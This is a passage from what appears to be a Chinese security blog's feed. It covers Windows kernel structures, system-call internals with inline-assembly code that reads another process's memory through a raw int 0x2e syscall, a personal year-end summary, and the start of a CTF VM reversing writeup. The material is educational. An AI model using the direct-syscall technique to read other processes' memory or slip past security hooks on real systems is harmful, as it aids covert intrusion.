Void</span><br><span class="line">   +0x0c0 WaitBlock        : [4] _KWAIT_BLOCK</span><br><span class="line">   +0x120 QueueListEntry   : _LIST_ENTRY</span><br><span class="line">   +0x128 TrapFrame        : Ptr32 _KTRAP_FRAME</span><br><span class="line">   +0x12c FirstArgument    : Ptr32 Void</span><br><span class="line">   +0x130 CallbackStack    : Ptr32 Void</span><br><span class="line">   +0x130 CallbackDepth    : Uint4B</span><br><span class="line">   +0x134 ApcStateIndex    : UChar</span><br><span class="line">   +0x135 BasePriority     : Char</span><br><span class="line">   +0x136 PriorityDecrement : Char</span><br><span class="line">   +0x136 ForegroundBoost  : Pos 0, 4 Bits</span><br><span class="line">   +0x136 UnusualBoost     : Pos 4, 4 Bits</span><br><span class="line">   +0x137 Preempted        : UChar</span><br><span class="line">   +0x138 AdjustReason     : UChar</span><br><span class="line">   +0x139 AdjustIncrement  : Char</span><br><span class="line">   +0x13a PreviousMode     : Char</span><br><span class="line">   +0x13b Saturation       : Char</span><br><span class="line">   +0x13c SystemCallNumber : Uint4B</span><br><span class="line">   +0x140 FreezeCount      : Uint4B</span><br><span class="line">   +0x144 UserAffinity     : _GROUP_AFFINITY</span><br><span class="line">   +0x150 Process          : Ptr32 _KPROCESS</span><br><span class="line">   +0x154 Affinity         : _GROUP_AFFINITY</span><br><span class="line">   +0x160 IdealProcessor   : Uint4B</span><br><span class="line">   +0x164 UserIdealProcessor : Uint4B</span><br><span class="line">   +0x168 ApcStatePointer  : [2] Ptr32 _KAPC_STATE</span><br><span class="line">   +0x170 SavedApcState    : _KAPC_STATE</span><br><span class="line">   +0x170 SavedApcStateFill : [23] UChar</span><br><span class="line">   +0x187 WaitReason       : UChar</span><br><span class="line">   +0x188 SuspendCount     : Char</span><br><span class="line">   +0x189 Spare1           : Char</span><br><span class="line">   +0x18a OtherPlatformFill : UChar</span><br><span class="line">   +0x18c Win32Thread      : Ptr32 Void</span><br><span class="line">   +0x190 StackBase        : Ptr32 Void</span><br><span class="line">   +0x194 SuspendApc       : _KAPC</span><br><span class="line">   +0x194 SuspendApcFill0  : [1] UChar</span><br><span class="line">   +0x195 ResourceIndex    : UChar</span><br><span class="line">   +0x194 SuspendApcFill1  : [3] UChar</span><br><span class="line">   +0x197 QuantumReset     : UChar</span><br><span class="line">   +0x194 SuspendApcFill2  : [4] UChar</span><br><span class="line">   +0x198 KernelTime       : Uint4B</span><br><span class="line">   +0x194 SuspendApcFill3  : [36] UChar</span><br><span class="line">   +0x1b8 WaitPrcb         : Ptr32 _KPRCB</span><br><span class="line">   +0x194 SuspendApcFill4  : [40] UChar</span><br><span class="line">   +0x1bc LegoData         : Ptr32 Void</span><br><span class="line">   +0x194 SuspendApcFill5  : [47] UChar</span><br><span class="line">   +0x1c3 LargeStack       : UChar</span><br><span class="line">   +0x1c4 UserTime         : Uint4B</span><br><span class="line">   +0x1c8 SuspendSemaphore : _KSEMAPHORE</span><br><span class="line">   +0x1c8 SuspendSemaphorefill : [20] UChar</span><br><span class="line">   +0x1dc SListFaultCount  : Uint4B</span><br><span class="line">   +0x1e0 ThreadListEntry  : _LIST_ENTRY</span><br><span class="line">   +0x1e8 MutantListHead   : _LIST_ENTRY</span><br><span class="line">   +0x1f0 SListFaultAddress : Ptr32 Void</span><br><span class="line">   +0x1f4 ThreadCounters   : Ptr32 _KTHREAD_COUNTERS</span><br><span class="line">   +0x1f8 XStateSave       : Ptr32 _XSTATE_SAVE</span><br></pre></td></tr></table></figure><p>来看看几个重要成员</p><ul><li><code>PreviousMode</code>：先前模式，如果0环调用的，值为<code>0</code>。如果为3环调用的，值为<code>1</code>。</li><li><code>DebugActive</code>：调试活动状态，指示当前线程是否处于调试状态。如果这个成员被设成0，则会影响硬件断点无法断下。</li><li><code>TrapFrame</code>：栈帧，一个线程一个栈帧结构体。</li></ul><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_3">http://www.qfrost.com/posts/windowskernel/windows系统调用学习笔记_3</a></li><li>[2]：<a href="https://www.cnblogs.com/wingsummer/p/15543945.html">https://www.cnblogs.com/wingsummer/p/15543945.html</a></li></ul>]]></content>
    
    
    <summary type="html">来学习一下Windows系统调用的相关结构体</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="系统调用" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>windows系统调用学习——R3到R0</title>
    <link href="https://xia0ji233.github.io/2025/01/21/WindowsSyscall1/"/>
    <id>https://xia0ji233.github.io/2025/01/21/WindowsSyscall1/</id>
    <published>2025-01-21T13:00:00.000Z</published>
    <updated>2025-01-21T13:49:03.074Z</updated>
    
    <content type="html"><![CDATA[<p>来学习一下windows的系统调用</p><span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>API，应用程序接口（Application Programming Interface）。Windows API 顾名思义就是 Windows 提供的应用程序接口，为了在 Windows 上实现一定的功能，我们需要学习 API 的用途、传参、返回值等，微软对这部分都提供了大量的文档说明，因此详细学习 API 的实现原理对我们而言是很有必要的。</p><h2 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h2><p>先介绍几个比较重要的 DLL，几乎所有的 Windows 应用程序都会有对这些 DLL 的使用。</p><ul><li><code>Kernel32.dll</code>：最核心的功能模块，比如管理内存、进程和线程相关的函数等。</li><li><code>User32.dll</code>：是 <code>Windows</code> 用户界面相关应用程序接口，如创建窗口和发送消息等。</li><li><code>GDI32.dll</code>：全称是 <code>Graphical Device Interface</code>，即<strong>图形设备接口</strong>，包含用于画图和显示文本的函数.比如要显示一个程序窗口，就调用了其中的函数来画这个窗口。</li><li><code>Ntdll.dll</code>：大多数 <code>API</code> 都会通过这个 <code>DLL</code> 进入内核。</li></ul><p>并不是所有的 API 都需要进 Ring0，比如 <code>strlen</code> 之类的函数，Ring3 就能实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">strlen</span><span class="params">(<span class="type">char</span> *s)</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> len=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(*s)&#123;</span><br><span class="line">        len++;</span><br><span class="line">        s++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是大部分跨进程操作，调度等都是需要进入 Ring0 的，比如跨进程读API：<code>ReadProcessMemory</code>。</p><p>这里可以直接调试看看链路，入口点通常是 kernel32.dll 的 ReadProcessMemory，最后调用了 kernelbase.dll的 ReadProcessMemory。</p><img src="/2025/01/21/WindowsSyscall1/1.png" class=""><p>这里的 <code>NtReadVirtualMemory</code> 导入自 <code>ntdll.dll</code>，同样来到这里</p><img src="/2025/01/21/WindowsSyscall1/2.png" class=""><p>发现这里的 <code>NtReadVirtualMemory</code> 仅仅是通过一个标志位选择走 <code>syscall</code> 指令或者 <code>int 0x2E</code> 指令。</p><p>这里的标志位在 <code>0x7ffe0000</code> 页内，是用于保存一个 <strong>_KUSER_SHARED_DATA</strong> 结构体使用的，不过这里看到指向了一个 <code>SystemCallPad </code> 保留结构，不太清楚为啥。通过中断门去调用这个好说，毕竟前面学过中断门是 r3 到 r0 的一个途径之一。</p><h2 id="syscall实现"><a href="#syscall实现" class="headerlink" title="syscall实现"></a>syscall实现</h2><p>主要来讲讲 syscall 的实现，CPU有一个 MSR 寄存器，每个 MSR寄存器都有一个 id ，叫 MSR Index。</p><table><thead><tr><th align="center">MSR</th><th align="center">Index</th></tr></thead><tbody><tr><td align="center">IA32_SYSENTER_CS</td><td align="center">174H</td></tr><tr><td align="center">IA32_SYSENTER_ESP</td><td align="center">175H</td></tr><tr><td align="center">IA32_SYSENTER_EIP</td><td align="center">176H</td></tr></tbody></table><p>来到windbg可以通过 0x176 的rdmsr命令得到系统调用入口。</p><img src="/2025/01/21/WindowsSyscall1/3.png" class=""><p>0x174 和 0x175 则分别表示进入系统调用后新的 CS 和 ESP 的值，SS 默认为 CS+8。</p><h2 id="中断门实现"><a href="#中断门实现" class="headerlink" title="中断门实现"></a>中断门实现</h2><p>直接查看 idt 表看看入口点即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !idt 0x2e</span><br><span class="line"></span><br><span class="line">Dumping IDT: 80b93000</span><br><span class="line"></span><br><span class="line">2e:83c77fea nt!KiSystemService</span><br></pre></td></tr></table></figure><hr><p>为什么说直接的 <code>syscall</code> 或者 <code>sysenter</code> 叫快速系统调用，因为中断门跳过去的过程涉及到读内存（IDT表），而直接 <code>syscall</code> 或者 <code>sysenter</code> 跳过去仅仅是读取了 <code>MSR</code> 寄存器。</p><hr><p>这里也算摸清楚了，<code>_KUSER_SHARED_DATA+0x300</code> 上存了 <code>KiIntSystemCall</code> 或 <code>KiFastSystemCall</code> 其中之一，而 <code>KiInitSystemCall</code> 就是 <code>int 0x2e;ret</code>，而另一个则是 <code>sysenter;ret</code>。</p><h2 id="Windows系统调用约定"><a href="#Windows系统调用约定" class="headerlink" title="Windows系统调用约定"></a>Windows系统调用约定</h2><p>这玩意跟之前的都不一样，其主要原因便是，Intel 给的中断门不支持传参，不像调用门那样，给定传参个数在执行 <code>call far</code> 指令的时候就会把 R3 栈中的参数全部搬到 R0 栈，那么直接在 R0 层写代码跟 R3 层写代码没什么不同了，可以使用同样类型的调用约定。</p><p>Windows 的所有系统调用都要求我们把参数按顺序排列放到一个内存中，将该内存的指针给到 EDX 寄存器。</p><p>回顾一下 Linux 的系统调用，同样也是不同于 R3 层的各种调用约定，通常参数小于五个的系统调用会依次把参数传给 <code>EBX,ECX,EDX,ESI,EDI</code> 中，而超过五个参数的系统调用则与 Windows 的做法一样，不过是将参数地址保存到了 EBX 中。</p><p>据此可以编写不依赖任何动态库的 <code>ReadProcessMemory</code> 函数。</p><p>测试程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0x12345678</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;a = %p\n&quot;</span>, &amp;a);</span><br><span class="line">    DWORD PID = GetCurrentProcessId();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PID = %d\n&quot;</span>, PID);</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据该程序运行结果，编写第二个程序，通过中断门调用 <code>ReadProcessMemory</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MyReadProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCVOID lpBaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPDWORD lpNumberOfBytesRead)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">                lea  eax, [ebp + <span class="number">0x14</span>]</span><br><span class="line">                push eax; ReturnLength</span><br><span class="line">                push[ebp + <span class="number">0x14</span>]; BufferLength</span><br><span class="line">                push[ebp + <span class="number">0x10</span>]; Buffer</span><br><span class="line">                push[ebp + <span class="number">0x0C</span>]; BaseAddress</span><br><span class="line">                push[ebp + <span class="number">0x08</span>]; ProcessHandle</span><br><span class="line">                mov  eax, <span class="number">0115</span>h</span><br><span class="line">                mov  edx, esp</span><br><span class="line">                <span class="type">int</span>  <span class="number">0x2e</span> </span><br><span class="line">                add  esp, <span class="number">20</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;read=%d\n&quot;</span>,*lpNumberOfBytesRead);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD PID = <span class="number">3112</span>;</span><br><span class="line">    DWORD pBuffer;</span><br><span class="line">    DWORD reads=<span class="number">0</span>;</span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, PID);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hProcess = %x \n&quot;</span>, hProcess);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;pBuffer, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">MyReadProcessMemory</span>(hProcess, (PVOID)<span class="number">0x19f82C</span>, &amp;pBuffer, <span class="number">4</span>, &amp;reads);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pBuffer = %x \n&quot;</span>, pBuffer);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><img src="/2025/01/21/WindowsSyscall1/4.png" class=""><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：MSDN</li><li>[2]：<a href="https://www.cnblogs.com/onetrainee/p/11705191.html">https://www.cnblogs.com/onetrainee/p/11705191.html</a></li><li>[3]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_1">http://www.qfrost.com/posts/windowskernel/windows系统调用学习笔记_1</a></li></ul>]]></content>
    
    
    <summary type="html">来学习一下windows的系统调用</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="系统调用" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>2024年终总结</title>
    <link href="https://xia0ji233.github.io/2024/12/31/Summary2024/"/>
    <id>https://xia0ji233.github.io/2024/12/31/Summary2024/</id>
    <published>2024-12-31T11:00:00.000Z</published>
    <updated>2025-01-16T12:48:06.080Z</updated>
    
    <content type="html"><![CDATA[<p>2024年也快过去了，过去的目标完成了多少，现在又如何呢？</p><span id="more"></span><h2 id="2024总结"><a href="#2024总结" class="headerlink" title="2024总结"></a>2024总结</h2><div class="timeline  green"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2024 </p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-05</p></div></div><div class='timeline-item-content'><ul><li>在队内师傅的带领下，开始写 LLVM 的插件，持续开发到六月份，也算给自己计算机生涯积累了一个大的项目开发经验。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-14</p></div></div><div class='timeline-item-content'><ul><li>时隔两年，再次走上 EC Finals 的舞台，感谢老师们坚持不懈的努力拿到了来之不易的一个名额，最后遗憾打铁，但是这趟上海之行依然很开心。</li></ul><p>附一段当时写的半退役感言：</p><blockquote><p>人生中最后一场以大学生身份参加的EC finals还是没能以一个较好的结局结束，不过也收获了一次较好的回忆吧。</p><p>时间线拉回到六年之前，那时的我也只不过是一个再平凡不过的高一学生，没有同龄人那样出众的智慧，所幸一次偶然的机会让我接触到了算法竞赛（感谢我高中的信息技术老师），这便一下吸引了我，在老师的帮助下，我得以今入隔壁强校进行旁听。但是也隐约感觉到这条路以我现有的能力举步维艰，最后没能打进去也是也是因为自己客观上能力不够，主观上对待还是不够认真，没能得到一个很好的结果。但是从此这也在我心中种下一个种子，我很庆幸，在迷迷茫茫的高中找准了自己的方向，高考填报志愿时，也是80个志愿直接梭哈计算机。</p><p>进入大学之后，也是非常想弥补高中时留下的遗憾，选择坚持了两年的ACM，第一年省赛，铜。但是与此同时，上了大学之后的信息差也是非常明显的，我们有将近一年半的时间甚至不知道ccpc，icpc等比赛，这里也感谢杭电的朋友们，让Jiaxing University第一次出现在了icpc的舞台上并拿到铜牌。往后也是因为自己一直不能够一直专注，基本上也都是打铁而归吧，诚然，ctf是兴趣驱动，算竞经过大一一年之后的洗礼之后已然从兴趣变成了一种执念了。虽然是一个不算很完美的结果，但是这打算竞一段段美好的回忆也足够深刻。</p></blockquote></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>02-26</p></div></div><div class='timeline-item-content'><ul><li>得知自己的考研成绩，与SUS无缘，遂开始扔简历找实习，基本碰壁，最后靠队里师傅收留，找到一个实习的机会，持续实习了半个月，后道心破碎，想着4月走调剂吧，毕竟国家线稳过的。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>03-29</p></div></div><div class='timeline-item-content'><ul><li>西湖论剑进入决赛，感谢朋友们看到抄送我的邮件（因为忘了是填了outlook邮箱），最后一天卡着点交上了报名信息。</li></ul><img src="/2024/12/31/Summary2024/1.png" class=""><p>面基了很多师傅，也在杭州的午夜进行了一次多人city walk。</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>04-15</p></div></div><div class='timeline-item-content'><ul><li>ZJCPC 差点银牌，最后还是差点罚时拿铜牌了，只能说对得起队友和自己四年在XCPC上的努力了。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>04-16</p></div></div><div class='timeline-item-content'><ul><li>山科大的调剂发了复试通知，选接受并最后拟录取了，当时的我身心俱疲，想着就这样吧。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>09-30</p></div></div><div class='timeline-item-content'><ul><li>研究生的课程和本科生的课程没什么太大的区别，便想着自己找事情做了，经过导师的同意直接出去投实习。在知道我最想去的一个岗位有hc之后，便开始认真学习相关内容了，一直到今天跨年的时候，仍对相关知识保持高强度的学习&amp;实践。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-14</p></div></div><div class='timeline-item-content'><ul><li>华为研究生网安比赛两天的线下游，拿了保底三等奖，最关键是肃清了研究生生涯中的一些主要矛盾和次要矛盾，也聊了很多，走了很多地方去玩，也是非常开心，华为之夜还抽中了耳机。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>12-05</p></div></div><div class='timeline-item-content'><ul><li>和Nepnep战队一起参加的强网杯，虽然能做的尽力做了，但是一想到就差几分就能拿二等奖依旧有点难过，想着如果再努力一点会不会能把 RW 的那题做出来。赛后，也是心有不甘，和队里师傅商量积极完成了赛题的复现，趁此学习了一波，希望明年不会再留这个遗憾了。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>12-31</p></div></div><div class='timeline-item-content'><ul><li>也就是今天吧，“玩”了很久的二次元开放世界冒险游戏，希望明年能好好“玩”。</li><li>为了这个，也是尽量学习了自己以前望而生畏的工具，去细细研究之后才发现其实没有那么可怕，甚至深入进去之后觉得就需要一个这样的工具，我想这应该就是所谓的，“曾经我看山是山，看水是水，后来我看山不是山，看水不是水，再后来我看山还是山，看水还是水”，我的认知也随着这一次次否定之否定在慢慢地螺旋上升吧。</li></ul></div></div></div><p>2024总结就是，遗憾是多的，前路也是明亮的，新的一年，仍需朝着自己的目标，努力学习。</p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>往年的年终总结是有目标的，但是鉴于自己 p 人的性格，还是不写了，明确大体方向就 OK。希望新的一年，变得更加优秀，朝着更好的方向，稳步前进。</p>]]></content>
    
    
    <summary type="html">2024年终总结</summary>
    
    
    
    <category term="随笔" scheme="https://xia0ji233.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    <category term="年终总结" scheme="https://xia0ji233.github.io/categories/%E9%9A%8F%E7%AC%94/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
    
  </entry>
  
  <entry>
    <title>强网杯S8决赛Reverse writeup</title>
    <link href="https://xia0ji233.github.io/2024/12/11/qwb2024_final_reverse/"/>
    <id>https://xia0ji233.github.io/2024/12/11/qwb2024_final_reverse/</id>
    <published>2024-12-11T05:00:00.000Z</published>
    <updated>2025-01-16T12:46:13.277Z</updated>
    
    <content type="html"><![CDATA[<p>复盘一下强网决赛的Reverse题。</p><span id="more"></span><h2 id="S1mpleVM"><a href="#S1mpleVM" class="headerlink" title="S1mpleVM"></a>S1mpleVM</h2><p><a href="S1mpLeVM_6d429db3ceeba8f95131c477020ee899.zip">附件下载</a></p><p>题目名字已经很明显的告诉你了，就是 vm 逆向。</p><h3 id="基本分析"><a href="#基本分析" class="headerlink" title="基本分析"></a>基本分析</h3><p>入口其实没啥，就是输入 32 长度的 passcode 然后校验，启动方式是 <code>./secret_box.exe quest</code> 命令行传参。</p><p>可以找到最关键的函数 <code>sub_140001D30</code> 就是 VM 入口。</p><img src="/2024/12/11/qwb2024_final_reverse/1.png" class=""><p>这个函数里面很明显的 vm_handler</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vmrun</span><span class="params">(<span class="type">char</span> *input, <span class="type">char</span> *vmcode)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//some defs for local variable</span></span><br><span class="line">  v2 = <span class="number">0LL</span>;</span><br><span class="line">  v3 = *vmcode - <span class="number">16</span>;</span><br><span class="line">  v5 = v48;</span><br><span class="line">  v6 = vmcode + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v9 = v2;</span><br><span class="line">          v2 = (<span class="type">signed</span> <span class="type">int</span> *)*((_QWORD *)v2 + <span class="number">1</span>);</span><br><span class="line">          v7 = *v9;</span><br><span class="line">          <span class="built_in">free</span>(v9);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = v2;</span><br><span class="line">            v2 = (<span class="type">signed</span> <span class="type">int</span> *)*((_QWORD *)v2 + <span class="number">1</span>);</span><br><span class="line">            v8 = *v10;</span><br><span class="line">            <span class="built_in">free</span>(v10);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v8 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = <span class="number">0x80000000</span>;</span><br><span class="line">          v8 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v11 = (<span class="type">signed</span> <span class="type">int</span> *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        *v11 = v7 % v8;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">LABEL_53:</span><br><span class="line">      *((_QWORD *)v11 + <span class="number">1</span>) = v2;</span><br><span class="line">      v2 = v11;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难发现，v3 是所谓的 opcode，v6 是 PC 指针，并且 vmcode 是实际的字节码 <code>- 0x10</code>，下面来一个个分析这些 vm 的指令。</p><p>首先是 0 号指令，做了一个较为复杂的指针操作。这里初看可能啥也看不明白，但是可以发现最下面它分配了 0x10 的空间同时又 v7 和 v8 做模运算了赋值给 v11 指向的地址。</p><p>操作完成之后又执行了 <code>*((_QWORD *)v11 + 1) = v2;</code> 和 <code>v2 = v11;</code>，如此种种的迹象显然不难让人联想到一种结构：链表。如果将划分的 0x10 字节内存进行划分，也可以看出，前八个字节存储数据，后八个字节存储指针。</p><p><code>shift+F1</code> 打开 IDA 的 <code>local type</code> 窗口，按 <code>insert</code> 键插入结构体的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkEntry</span>&#123;</span></span><br><span class="line">    <span class="type">signed</span> val;</span><br><span class="line">    LinkEntry * next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 v11 和 v2 定义修改之后，IDA 将展示如下的伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line"><span class="keyword">if</span> ( v2 